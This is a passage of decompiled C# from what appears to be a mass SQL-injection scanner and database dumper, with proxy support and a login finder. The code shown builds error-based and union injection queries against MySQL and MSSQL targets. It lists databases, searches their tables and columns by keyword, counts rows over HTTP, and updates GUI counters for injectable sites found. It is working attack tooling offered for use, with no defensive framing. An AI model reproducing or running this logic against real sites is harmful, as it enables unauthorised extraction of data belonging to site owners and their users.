						text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
						if (!string.IsNullOrEmpty(text3))
						{
							break;
						}
						num++;
						if (num < class49_0.Retry)
						{
							continue;
						}
						goto default;
					}
					list5 = DumperForm.method_17(text3, class49_0.o.DBType);
					if (list5.Count != 0)
					{
						list2.Add(list5[0]);
					}
					num = 0;
					num2 = 0;
					if (!class49_0.CurrentDB)
					{
						while (true)
						{
							if (threadPool_0.ThreadCount == 1)
							{
								method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] Search " + class49_0.SearchType.ToString() + " '" + class49_0.Search + "' Loading DB " + Conversions.ToString(num2) + " | " + Class23.smethod_11(class49_0.String_0));
							}
							list5.Clear();
							list5.Add("DB_NAME(" + Conversions.ToString(num2) + ")");
							if (method_23())
							{
								break;
							}
							string string_ = MSSQL.Info(class49_0.String_0, oError, class49_0.o.MSSQLCollate, list5, "char");
							Class54.smethod_1(ref string_);
							text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
							if (!string.IsNullOrEmpty(text3))
							{
								list5 = DumperForm.method_17(text3, class49_0.o.DBType);
								if (list5.Count != 0)
								{
									if (!list2.Contains(list5[0]))
									{
										list2.Add(list5[0]);
									}
									num = 0;
									num2++;
									continue;
								}
								goto IL_0c71;
							}
							num++;
							if (num >= class49_0.Retry)
							{
								break;
							}
						}
						goto default;
					}
				}
				goto IL_0c71;
			default:
				list.Sort();
				if (list.Count > 0)
				{
					text = Globals.translate_0.GetStr(this, 91) + " '" + class49_0.Search + "' " + Globals.translate_0.GetStr(this, 92) + " " + Strings.FormatNumber(num5, 0) + ", " + Globals.translate_0.GetStr(this, 93) + " " + Strings.FormatNumber(list.Count, 0) + " " + Globals.translate_0.GetStr(this, 94) + " ";
					foreach (string item4 in list)
					{
						text = text + "; " + item4;
					}
					if (searchColumn_0 != null)
					{
						lock (searchColumn_0)
						{
							searchColumn_0.method_1(class49_0.String_0, Class54.smethod_5(class49_0.o.DBType), class49_0.Search, (int)num5, list);
						}
					}
				}
				else if (num >= class49_0.Retry)
				{
					Globals.DG_SQLi.method_3(Globals.translate_0.GetStr(this, 95), 6, class49_0.Item);
				}
				return text;
			case Types.Oracle_No_Error:
			case Types.Oracle_With_Error:
				{
					return "";
				}
				IL_0c71:
				num = 0;
				num2 = 0;
				if (list2.Contains("master"))
				{
					list2.Remove("master");
				}
				if (list2.Contains("model"))
				{
					list2.Remove("model");
				}
				if (list2.Contains("msdb"))
				{
					list2.Remove("msdb");
				}
				if (list2.Contains("tempdb"))
				{
					list2.Remove("tempdb");
				}
				if (list2.Count != 0)
				{
					if (!method_23())
					{
						lock (_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS)
						{
							if (!_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS.ContainsKey(class49_0.String_0))
							{
								_0024STATIC_0024AnalizerCheckColumn_0024201E1283BC_0024cDBS.Add(class49_0.String_0, list2);
							}
						}
					}
					while (num2 <= list2.Count - 1)
					{
						string text7 = list2[num2];
						string text4 = "select cast(count(t.name) as char) as x from [" + text7 + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and c.name like " + Class23.smethod_21("%" + class49_0.Search + "%", bool_0: false);
						if (threadPool_0.ThreadCount == 1)
						{
							method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] Search " + class49_0.SearchType.ToString() + " '" + class49_0.Search + "' [" + Conversions.ToString(num2 + 1) + "/" + Conversions.ToString(list2.Count) + "] Checking Tables on DB '" + text7 + "'  | " + Class23.smethod_11(class49_0.String_0));
						}
						int num3 = method_52(class49_0, class49_0.String_0, "", text4);
						text4 = "select top 1 x from ( select distinct top [x] (t.name) as x from [" + text7 + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and c.name like " + Class23.smethod_21("%" + class49_0.Search + "%", bool_0: false) + " order by x asc) sq order by x desc";
						if (num3 == 0)
						{
							num2++;
							continue;
						}
						int num9 = 0;
						while (true)
						{
							if (threadPool_0.ThreadCount == 1)
							{
								method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 7) + " " + class49_0.SearchType.ToString() + class49_0.Search + "' [" + Conversions.ToString(num2 + 1) + "/" + Conversions.ToString(list2.Count) + "]  DB '" + text7 + "' Table " + Conversions.ToString(num9) + " | " + Class23.smethod_11(class49_0.String_0));
							}
							string string_ = MSSQL.Dump(class49_0.String_0, "", "", null, bIFNULL: false, oError, "char", class49_0.o.MSSQLCollate, num9, 0, "", "", "", text4);
							Class54.smethod_1(ref string_);
							if (method_23())
							{
								break;
							}
							string text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
							if (!string.IsNullOrEmpty(text3))
							{
								List<string> list5 = DumperForm.method_17(text3, class49_0.o.DBType);
								if (list5.Count > 0)
								{
									array = Strings.Split(list5[0], Class54.string_2);
									if (array.Length > 0 && !list4.Contains(array[0]))
									{
										string string_4 = "select cast(isnull(count(*),char(32)) as char) as x from [" + text7 + "]..[" + array[0] + "]";
										int num4 = method_52(class49_0, class49_0.String_0, "*", string_4);
										if (num4 > 0)
										{
											string item3 = "[" + Strings.FormatNumber(num4, 0) + "] " + text7 + "." + array[0];
											list.Add(item3);
											list4.Add(array[0]);
											num5 += num4;
										}
										else if (num4 == -1)
										{
											goto IL_11bf;
										}
										num = 0;
										if (class49_0.AllResults)
										{
											num9++;
											if (num9 <= num3)
											{
												continue;
											}
										}
									}
								}
							}
							else
							{
								num++;
								if (num < class49_0.Retry)
								{
									continue;
								}
							}
							goto IL_11bf;
						}
						break;
						IL_11bf:
						num2++;
					}
				}
				goto default;
			}
		}
	}

	private string method_51(Class49 class49_0)
	{
		string text = "";
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		if (_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS_0024Init, ref lockTaken);
			if (_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS_0024Init.State == 0)
			{
				_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS_0024Init.State = 2;
				_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS = new Dictionary<string, List<string>>();
			}
			else if (_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS_0024Init);
			}
		}
		if (_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS.ContainsKey(class49_0.String_0))
		{
			list2 = _0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS[class49_0.String_0];
		}
		List<string> list3 = new List<string>();
		string[] array = new string[2];
		string text2 = "";
		List<string> list4 = new List<string>();
		checked
		{
			long num5 = default(long);
			int num = default(int);
			InjectionType oError = default(InjectionType);
			int num2 = default(int);
			switch (class49_0.o.DBType)
			{
			case Types.MySQL_No_Error:
			case Types.MySQL_With_Error:
			{
				list3.AddRange(new string[2] { "d.schema_name", "t.table_name" });
				string text4 = "from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) " + (class49_0.CurrentDB ? "and d.schema_name = database() " : " ") + "and t.table_name like " + Class23.smethod_20("%" + class49_0.Search + "%") + " # group by t.table_name";
				int num3 = method_52(class49_0, class49_0.String_0, "t.table_name", text4.Replace("group by t.table_name", "").Replace("#", ""));
				text4 += " limit [x],[y]";
				if (num3 == 0)
				{
					return "";
				}
				if (class49_0.o.DBType == Types.MySQL_No_Error)
				{
					text4 = text4.Replace("#", "");
					while (true)
					{
						if (threadPool_0.ThreadCount == 1)
						{
							method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 96) + " '" + class49_0.Search + "' [" + Globals.translate_0.GetStr(this, 89) + " " + Conversions.ToString(num2 + 1) + "/" + Conversions.ToString(num3) + " | " + Class23.smethod_11(class49_0.String_0));
						}
						string string_ = MySQLNoError.Dump(class49_0.String_0, unchecked((MySQLCollactions)(0u - (class49_0.o.MSSQLCollate ? 1u : 0u))), bHexEncoded: false, bIFNULL: false, "", "", list3, num2, 1, "", "", "", text4);
						Class54.smethod_1(ref string_);
						if (method_23())
						{
							break;
						}
						string text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
						if (!string.IsNullOrEmpty(text3))
						{
							List<string> list6 = DumperForm.method_17(text3, class49_0.o.DBType);
							if (list6.Count <= 0)
							{
								break;
							}
							array = Strings.Split(list6[0], Class54.string_2);
							if (array.Length <= 1 || list4.Contains(array[1]))
							{
								break;
							}
							string string_2 = "from " + array[0] + "." + array[1];
							int num4 = method_52(class49_0, class49_0.String_0, "*", string_2);
							if (num4 > 0)
							{
								string item = "[" + Strings.FormatNumber(num4, 0) + "] " + array[0] + "." + array[1];
								list.Add(item);
								list4.Add(array[1]);
								num5 += num4;
							}
							num = 0;
							num2++;
							if (!class49_0.AllResults || num2 > num3)
							{
								break;
							}
						}
						else
						{
							num++;
							if (num >= class49_0.Retry)
							{
								break;
							}
						}
					}
				}
				else if (class49_0.o.DBType == Types.MySQL_With_Error)
				{
					string text5 = text4;
					List<string> list7 = new List<string>();
					int num6 = num3 - 1;
					for (num2 = 0; num2 <= num6; num2++)
					{
						if (list7.Count > 0)
						{
							string text6 = " and not t.table_name in (";
							int num7 = list7.Count - 1;
							for (int i = 0; i <= num7; i++)
							{
								if (i != 0)
								{
									text6 += ",";
								}
								text6 += Class23.smethod_20(list7[i]);
							}
							text6 += ")";
							text4 = text5.Replace("#", text6);
						}
						else
						{
							text4 = text5.Replace("#", "");
						}
						int num8 = 0;
						do
						{
							if (!unchecked((class49_0.CurrentDB & !string.IsNullOrEmpty(text2)) && num8 == 0))
							{
								if (threadPool_0.ThreadCount == 1)
								{
									method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 96) + " '" + class49_0.Search + "' [" + Globals.translate_0.GetStr(this, 89) + " " + Conversions.ToString(num2 + 1) + "/" + Conversions.ToString(num3) + "] [" + Conversions.ToString(num8 + 1) + "/2] | " + Class23.smethod_11(class49_0.String_0));
								}
								list3.Clear();
								switch (num8)
								{
								case 1:
									list3.Add("t.table_name");
									break;
								case 0:
									list3.Add("d.schema_name");
									break;
								}
								string string_ = MySQLWithError.Dump(class49_0.String_0, class49_0.o.MySQLCollactions, MySQLErrorType.DuplicateEntry, bIFNULL: false, "", "", list3, num2, 1, "", "", "", text4);
								Class54.smethod_1(ref string_);
								if (method_23())
								{
									break;
								}
								string text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
								if (!string.IsNullOrEmpty(text3))
								{
									List<string> list8 = Class2.Class3_0.Dumper_0.method_17(text3, class49_0.o.DBType);
									if (list8.Count <= 0)
									{
										break;
									}
									array[num8] = list8[0];
									if (num8 == 1)
									{
										if (list4.Contains(array[1]))
										{
											break;
										}
										list4.Add(array[1]);
									}
									if (num8 == 0)
									{
										text2 = list8[0];
									}
									num = 0;
								}
								else
								{
									num++;
									if (num >= class49_0.Retry)
									{
										break;
									}
								}
							}
							else
							{
								array[0] = text2;
							}
							num8++;
						}
						while (num8 <= 1);
						if (string.IsNullOrEmpty(array[0]) || string.IsNullOrEmpty(array[1]))
						{
							break;
						}
						string string_3 = "from " + array[0] + "." + array[1];
						int num4 = method_52(class49_0, class49_0.String_0, "*", string_3);
						if (num4 > 0)
						{
							string item2 = "[" + Strings.FormatNumber(num4, 0) + "] " + array[0] + "." + array[1];
							list.Add(item2);
							list7.Add(array[1]);
							num5 += num4;
						}
						array = new string[3];
						if (!class49_0.AllResults)
						{
							break;
						}
					}
				}
				goto default;
			}
			case Types.MSSQL_No_Error:
			case Types.MSSQL_With_Error:
				switch (class49_0.o.DBType)
				{
				case Types.MSSQL_With_Error:
					oError = InjectionType.Error;
					break;
				case Types.MSSQL_No_Error:
					oError = InjectionType.Union;
					break;
				}
				if (list2.Count == 0)
				{
					List<string> list5;
					string text3;
					while (true)
					{
						if (threadPool_0.ThreadCount == 1)
						{
							method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 96) + " '" + class49_0.Search + class49_0.Search + "' " + Globals.translate_0.GetStr(this, 97) + " | " + Class23.smethod_11(class49_0.String_0));
						}
						list5 = new List<string>();
						list5.Add("DB_NAME()");
						string string_ = MSSQL.Info(class49_0.String_0, oError, class49_0.o.MSSQLCollate, list5, "char");
						Class54.smethod_1(ref string_);
						text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
						if (!string.IsNullOrEmpty(text3))
						{
							break;
						}
						num++;
						if (num < class49_0.Retry)
						{
							continue;
						}
						goto default;
					}
					list5 = DumperForm.method_17(text3, class49_0.o.DBType);
					if (list5.Count != 0)
					{
						list2.Add(list5[0]);
					}
					num = 0;
					num2 = 0;
					if (!class49_0.CurrentDB)
					{
						while (true)
						{
							if (threadPool_0.ThreadCount == 1)
							{
								method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 96) + " '" + class49_0.Search + class49_0.Search + "' " + Globals.translate_0.GetStr(this, 99) + " " + Conversions.ToString(num2) + " | " + Class23.smethod_11(class49_0.String_0));
							}
							list5.Clear();
							list5.Add("DB_NAME(" + Conversions.ToString(num2) + ")");
							if (method_23())
							{
								break;
							}
							string string_ = MSSQL.Info(class49_0.String_0, oError, class49_0.o.MSSQLCollate, list5, "char");
							Class54.smethod_1(ref string_);
							text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
							if (!string.IsNullOrEmpty(text3))
							{
								list5 = DumperForm.method_17(text3, class49_0.o.DBType);
								if (list5.Count != 0)
								{
									if (!list2.Contains(list5[0]))
									{
										list2.Add(list5[0]);
									}
									num = 0;
									num2++;
									continue;
								}
								goto IL_0c2e;
							}
							num++;
							if (num >= class49_0.Retry)
							{
								break;
							}
						}
						goto default;
					}
				}
				goto IL_0c2e;
			default:
				list.Sort();
				if (list.Count > 0)
				{
					if (searchColumn_0 != null)
					{
						lock (searchColumn_0)
						{
							searchColumn_0.method_1(class49_0.String_0, Class54.smethod_5(class49_0.o.DBType), class49_0.Search, (int)num5, list);
						}
					}
					text = Globals.translate_0.GetStr(this, 96) + " '" + class49_0.Search + "' " + Globals.translate_0.GetStr(this, 92) + " " + Strings.FormatNumber(num5, 0) + ", " + Globals.translate_0.GetStr(this, 93) + " " + Strings.FormatNumber(list.Count, 0) + " " + Globals.translate_0.GetStr(this, 100) + " ";
					foreach (string item4 in list)
					{
						text = text + "; " + item4;
					}
				}
				else if (num >= class49_0.Retry)
				{
					Globals.DG_SQLi.method_3(Globals.translate_0.GetStr(this, 95), 6, class49_0.Item);
				}
				return text;
			case Types.Oracle_No_Error:
			case Types.Oracle_With_Error:
				{
					return "";
				}
				IL_0c2e:
				num = 0;
				num2 = 0;
				if (list2.Contains("master"))
				{
					list2.Remove("master");
				}
				if (list2.Contains("model"))
				{
					list2.Remove("model");
				}
				if (list2.Contains("msdb"))
				{
					list2.Remove("msdb");
				}
				if (list2.Contains("tempdb"))
				{
					list2.Remove("tempdb");
				}
				if (list2.Count != 0)
				{
					if (!_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS.ContainsKey(class49_0.String_0) & !method_23())
					{
						_0024STATIC_0024AnalizerCheckTable_0024201E1283BC_0024cDBS.Add(class49_0.String_0, list2);
					}
					while (num2 <= list2.Count - 1)
					{
						string text7 = list2[num2];
						string text4 = "select cast(count(t.name) as char) as x from [" + text7 + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and t.name like " + Class23.smethod_21("%" + class49_0.Search + "%", bool_0: false);
						if (threadPool_0.ThreadCount == 1)
						{
							method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 96) + Globals.translate_0.GetStr(this, 99) + " '" + class49_0.Search + class49_0.Search + "' [" + Conversions.ToString(num2 + 1) + "/" + Conversions.ToString(list2.Count) + "]  '" + text7 + "'  | " + Class23.smethod_11(class49_0.String_0));
						}
						int num3 = method_52(class49_0, class49_0.String_0, "", text4);
						text4 = "select top 1 x from ( select distinct top [x] (t.name) as x from [" + text7 + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and t.name like " + Class23.smethod_21("%" + class49_0.Search + "%", bool_0: false) + " order by x asc) sq order by x desc";
						if (num3 == 0)
						{
							num2++;
							continue;
						}
						int num9 = 0;
						while (true)
						{
							if (threadPool_0.ThreadCount == 1)
							{
								method_1("[" + Conversions.ToString(class49_0.Int32_0 + 1) + "/" + Conversions.ToString(class49_0.Count) + "] " + Globals.translate_0.GetStr(this, 96) + " '" + class49_0.Search + class49_0.Search + "' [" + Conversions.ToString(num2 + 1) + "/" + Conversions.ToString(list2.Count) + "]  " + Globals.translate_0.GetStr(this, 100) + " '" + text7 + "' " + Globals.translate_0.GetStr(this, 101) + " " + Conversions.ToString(num9) + " | " + Class23.smethod_11(class49_0.String_0));
							}
							string string_ = MSSQL.Dump(class49_0.String_0, "", "", null, bIFNULL: false, oError, "char", class49_0.o.MSSQLCollate, num9, 0, "", "", "", text4);
							Class54.smethod_1(ref string_);
							if (method_23())
							{
								break;
							}
							string text3 = class49_0.o.HTTPExt_0.QuickGet(string_);
							if (!string.IsNullOrEmpty(text3))
							{
								List<string> list5 = DumperForm.method_17(text3, class49_0.o.DBType);
								if (list5.Count <= 0)
								{
									break;
								}
								array = Strings.Split(list5[0], Class54.string_2);
								if (array.Length <= 0 || list4.Contains(array[0]))
								{
									break;
								}
								string string_4 = "select cast(isnull(count(*),char(32)) as char) as x from [" + text7 + "]..[" + array[0] + "]";
								int num4 = method_52(class49_0, class49_0.String_0, "*", string_4);
								if (num4 > 0)
								{
									string item3 = "[" + Strings.FormatNumber(num4, 0) + "] " + text7 + "." + array[0];
									list.Add(item3);
									list4.Add(array[0]);
									num5 += num4;
								}
								else if (num4 == -1)
								{
									break;
								}
								num = 0;
								if (!class49_0.AllResults)
								{
									break;
								}
								num9++;
								if (num9 > num3)
								{
									break;
								}
							}
							else
							{
								num++;
								if (num >= class49_0.Retry)
								{
									break;
								}
							}
						}
						num2++;
					}
				}
				goto default;
			}
		}
	}

	private int method_52(Class49 class49_0, string string_5, string string_6, string string_7)
	{
		int result = -1;
		List<string> list = new List<string>();
		list.Add("count(" + string_6 + ")");
		int num = default(int);
		while (true)
		{
			string string_8;
			string text;
			switch (class49_0.o.DBType)
			{
			case Types.MSSQL_With_Error:
				string_8 = MSSQL.Dump(string_5, "", "", list, bIFNULL: false, InjectionType.Error, class49_0.o.MSSQLCast, class49_0.o.MSSQLCollate, 0, 0, "", "", "", string_7);
				goto IL_0061;
			case Types.MSSQL_No_Error:
				string_8 = MSSQL.Dump(string_5, "", "", list, bIFNULL: false, InjectionType.Union, class49_0.o.MSSQLCast, class49_0.o.MSSQLCollate, 0, 0, "", "", "", string_7);
				goto IL_0061;
			case Types.MySQL_With_Error:
				string_8 = MySQLWithError.Dump(string_5, class49_0.o.MySQLCollactions, class49_0.o.MySQLErrorType, bIFNULL: false, "", "", list, 0, 1, "", "", "", string_7);
				goto IL_0061;
			case Types.MySQL_No_Error:
				string_8 = MySQLNoError.Dump(string_5, class49_0.o.MySQLCollactions, bHexEncoded: false, bIFNULL: false, "", "", list, 0, 1, "", "", "", string_7);
				goto IL_0061;
			default:
				{
					return 0;
				}
				IL_0061:
				Class54.smethod_1(ref string_8);
				text = class49_0.o.HTTPExt_0.QuickGet(string_8);
				if (!method_23())
				{
					if (!string.IsNullOrEmpty(text))
					{
						List<string> list2 = DumperForm.method_17(text, class49_0.o.DBType);
						if (list2.Count > 0)
						{
							if (Versioned.IsNumeric(list2[0]))
							{
								result = int.Parse(list2[0]);
							}
							goto IL_01e3;
						}
					}
					num = checked(num + 1);
					if (num < class49_0.Retry)
					{
						break;
					}
					goto IL_01e3;
				}
				return 0;
				IL_01e3:
				return result;
			}
		}
	}

	private void timer_1_Elapsed(object sender, EventArgs e)
	{
		if (!bool_2)
		{
			return;
		}
		if (base.InvokeRequired)
		{
			try
			{
				Invoke(new EventHandler(timer_1_Elapsed), sender, e);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		else
		{
			if (!lblMainStatus.Text.Equals(string_4))
			{
				lblMainStatus.Text = string_4;
			}
			if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks_0024Init == null)
			{
				Interlocked.CompareExchange(ref _0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks_0024Init, new StaticLocalInitFlag(), null);
			}
			bool lockTaken = false;
			try
			{
				Monitor.Enter(_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks_0024Init, ref lockTaken);
				if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks_0024Init.State == 0)
				{
					_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks_0024Init.State = 2;
					_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks = 1;
				}
				else if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks_0024Init.State = 1;
				if (lockTaken)
				{
					Monitor.Exit(_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks_0024Init);
				}
			}
			if (!Globals.IS_DUMP_INSTANCE && _0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks % 2 == 0)
			{
				Globals.GQueue.method_4();
			}
			if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks % 30 == 0)
			{
				_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks = 1;
			}
			else
			{
				checked
				{
					_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks++;
				}
			}
			string text;
			if (Globals.IS_DUMP_INSTANCE)
			{
				text = method_66(Globals.G_SOCKS.method_9());
				text = Globals.translate_0.GetStr(this, 103) + " " + text;
				if (!text.Equals(DumperForm.tpProxies.Text))
				{
					DumperForm.tpProxies.Text = text;
				}
				text = method_66(Globals.G_SOCKS.method_10());
				if (!text.Equals(lblSocksCount.Text))
				{
					lblSocksCount.Text = text;
				}
				return;
			}
			if (bool_3)
			{
				switch (mdiTabControl.SelectedIndex())
				{
				case 0:
					mdiTabControl.TabPages[mdiTabControl.SelectedIndex()].Animate(Boolean_1);
					break;
				case 2:
					mdiTabControl.TabPages[mdiTabControl.SelectedIndex()].Animate(DumperForm.Boolean_0);
					break;
				case 4:
					mdiTabControl.TabPages[mdiTabControl.SelectedIndex()].Animate(LoginFinderForm.RunningWorker);
					break;
				}
			}
			if (Globals.GStatistics != null && ((mdiTabControl != null && mdiTabControl.SelectedIndex() == 5 && uxTabControl_1.SelectedIndex == 2) | (twMain.SelectedNode == treeNode_14)))
			{
				if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks % 5 == 0)
				{
					Globals.GStatistics.method_1(Class26.Enum1.const_5, Globals.translate_0.GetStr(this, 104), Globals.FormatBytes(Process.GetCurrentProcess().WorkingSet64));
					Globals.GStatistics.method_1(Class26.Enum1.const_5, Globals.translate_0.GetStr(this, 105), Globals.FormatBytes(Process.GetCurrentProcess().PeakWorkingSet64));
				}
				Globals.GStatistics.method_1(Class26.Enum1.const_5, Globals.translate_0.GetStr(this, 106), DateAndTime.Now.Subtract(Process.GetCurrentProcess().StartTime).ToString("d\\.hh\\:mm\\:ss"));
				if (_0024STATIC_0024HandleTimerBackground_002420211C12819D_0024Tricks % 2 == 0)
				{
					long[] array = new long[2];
					if (DumperForm.AppDomainControl_0 != null)
					{
						AppDomainControl appDomainControl_ = DumperForm.AppDomainControl_0;
						array[0] = appDomainControl_.GetProcessCreated();
						array[1] = appDomainControl_.GetTotalRunning();
						appDomainControl_ = null;
					}
					checked
					{
						if (AppControlDomain != null)
						{
							AppDomainControl appControlDomain = AppControlDomain;
							array[0] += appControlDomain.GetProcessCreated();
							array[1] += appControlDomain.GetTotalRunning();
							appControlDomain = null;
						}
						if (array[0] > 0)
						{
							Globals.GStatistics.method_1(Class26.Enum1.const_6, "Process Created", array[0]);
							Globals.GStatistics.method_1(Class26.Enum1.const_6, "Running Process", array[1]);
						}
						else
						{
							Globals.GStatistics.method_1(Class26.Enum1.const_6, "Process Created", "");
							Globals.GStatistics.method_1(Class26.Enum1.const_6, "Running Process", "");
						}
					}
				}
				Globals.GStatistics.method_2();
			}
			text = ((twMain.SelectedNode == treeNode_3) ? Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 3) : ((!(DumperForm.Boolean_0 & (DumperForm.Int32_0 > 0))) ? Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 3) : (Conversions.ToString(DumperForm.Int32_0) + "% " + Globals.translate_0.GetStr(this, 108))));
			if (bool_3)
			{
				mdiTabControl.TabPages[2].Text = text;
				mdiTabControl.TabPages[2].Animate(DumperForm.Boolean_0);
			}
			else if (!text.Equals(treeNode_3.Text))
			{
				treeNode_3.Text = text;
			}
			text = ((twMain.SelectedNode == treeNode_10) ? Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 8) : ((!(LoginFinderForm.RunningWorker & (LoginFinderForm.RunningProgress > 0))) ? Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 8) : (Conversions.ToString(LoginFinderForm.RunningProgress) + "% " + Globals.translate_0.GetStr(this, 108))));
			if (bool_3)
			{
				mdiTabControl.TabPages[4].Animate(LoginFinderForm.RunningWorker);
			}
			else if (!text.Equals(treeNode_10.Text))
			{
				treeNode_10.Text = text;
			}
			text = method_66(Globals.GQueue.method_1());
			text = ((!bool_3) ? (Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 0) + " " + text) : (Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 14) + " " + text));
			if (bool_3)
			{
				if (!text.Equals(uxTabControl_0.TabPages[0].Text))
				{
					uxTabControl_0.TabPages[0].Text = text;
				}
				mdiTabControl.TabPages[0].Animate(Boolean_1);
			}
			else
			{
				if (!text.Equals(treeNode_0.Text))
				{
					treeNode_0.Text = text;
				}
				if (Globals.GQueue.method_1() > 0)
				{
					Globals.GMain.grbScannerURL.Text = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 14) + " " + Globals.FormatNumbers(Globals.GQueue.method_1());
				}
				else
				{
					Globals.GMain.grbScannerURL.Text = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 14);
				}
			}
			text = method_66(Globals.DG_SQLi.method_5());
			if ((enum6_0 == Enum6.const_4) & (int_1 > 0))
			{
				text = Globals.translate_0.GetStr(this, 111) + " " + text;
				text = Conversions.ToString(int_1) + "% " + text;
			}
			else
			{
				text = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 1) + " " + text;
			}
			if (bool_3)
			{
				if (!text.Equals(uxTabControl_0.TabPages[1].Text))
				{
					uxTabControl_0.TabPages[1].Text = text;
				}
			}
			else if (!text.Equals(treeNode_1.Text))
			{
				treeNode_1.Text = text;
			}
			text = Globals.FormatNumbers(Globals.DG_SQLi.method_6());
			if (!text.Equals(lblSQLi.Text))
			{
				lblSQLi.Text = text;
			}
			text = method_66(Globals.DG_SQLiNoInjectable.method_5());
			text = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 2) + " " + text;
			if (bool_3)
			{
				if (!text.Equals(uxTabControl_0.TabPages[3].Text))
				{
					uxTabControl_0.TabPages[3].Text = text;
				}
			}
			else if (!text.Equals(treeNode_2.Text))
			{
				treeNode_2.Text = text;
			}
			text = Globals.FormatNumbers(Globals.DG_SQLiNoInjectable.method_6());
			if (!text.Equals(lblSQLiNoInjectable.Text))
			{
				lblSQLiNoInjectable.Text = text;
			}
			text = method_66(Globals.DG_FileInclusao.method_5());
			text = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 4) + " " + text;
			if (bool_3)
			{
				if (!text.Equals(uxTabControl_0.TabPages[2].Text))
				{
					uxTabControl_0.TabPages[2].Text = text;
				}
			}
			else if (!text.Equals(treeNode_4.Text))
			{
				treeNode_4.Text = text;
			}
			text = Globals.FormatNumbers(Globals.DG_FileInclusao.method_6());
			if (!text.Equals(lblFileInclusao.Text))
			{
				lblFileInclusao.Text = text;
			}
			text = method_66(Globals.GTrash.method_3());
			text = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 5) + " " + text;
			if (bool_3)
			{
				if (!text.Equals(uxTabControl_0.TabPages[4].Text))
				{
					uxTabControl_0.TabPages[4].Text = text;
				}
			}
			else if (!text.Equals(treeNode_6.Text))
			{
